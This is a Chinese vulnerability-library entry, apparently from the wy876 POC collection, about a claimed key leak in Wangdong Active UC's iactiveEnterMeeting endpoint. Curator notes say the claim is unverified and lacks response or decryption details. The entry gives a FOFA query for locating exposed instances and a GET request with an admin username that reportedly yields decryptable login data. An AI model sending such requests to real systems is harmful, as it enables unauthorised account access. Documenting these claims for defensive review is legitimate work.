---
source: "wy876 漏洞文库"
title: "网动Active UC iactiveEnterMeeting密钥泄露声称"
product: "网动Active UC"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，roomid和用户名有效性条件未知"
prerequisites: "未说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/rq6gi25kn08phghs"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%BD%91%E5%8A%A8%E7%BB%9F%E4%B8%80%E9%80%9A%E4%BF%A1/%E7%BD%91%E5%8A%A8%E7%BB%9F%E4%B8%80%E9%80%9A%E4%BF%A1%E5%B9%B3%E5%8F%B0iactiveEnterMeeting%E5%AD%98%E5%9C%A8%E5%AF%86%E9%92%A5%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
fofa: "title=\"网动统一通信平台(Active UC)\""
fofa_unverified: "title="
id: "vw-37fe695af2cfe145e6d2b852"
entity_id: "ve-37fe695af2cfe145e6d2b852"
schema_version: "1"
---

# 网动Active UC iactiveEnterMeeting密钥泄露声称

## 条目说明

- 对象与具体问题：网动Active UC；iactiveEnterMeeting密钥泄露声称
- 版本、配置及部署条件：版本未知，roomid和用户名有效性条件未知
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有GET和解密后可登录一句，无返回字段、密钥类型、加解密算法或登录证明
- 房间ID/用户名是否越权可控需说明，标题密钥泄露与账号密码泄露不能混用
- 无版本/修复；去泛化产品介绍及空特征

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
 网动统一通信平台是一个涵盖了多种通信功能的综合平台，通常包括文字、语音、视频通讯等功能，并且可能提供了一系列的通讯工具和服务。这样的平台通常旨在提升用户的沟通效率和便利性，为用户提供一个统一的通信环境。网动统一通信平台iactiveEnterMeeting存在密钥泄露漏洞

## 二、影响版本
+ 网动统一通信平台

## 三、资产测绘
+ fofa`title="网动统一通信平台(Active UC)"`
+ 特征


---

## 四、漏洞复现
```http
GET /acenter/iactiveEnterMeeting.action?roomid=1&username=admin HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
```


解密后可登录系统


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rq6gi25kn08phghs>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
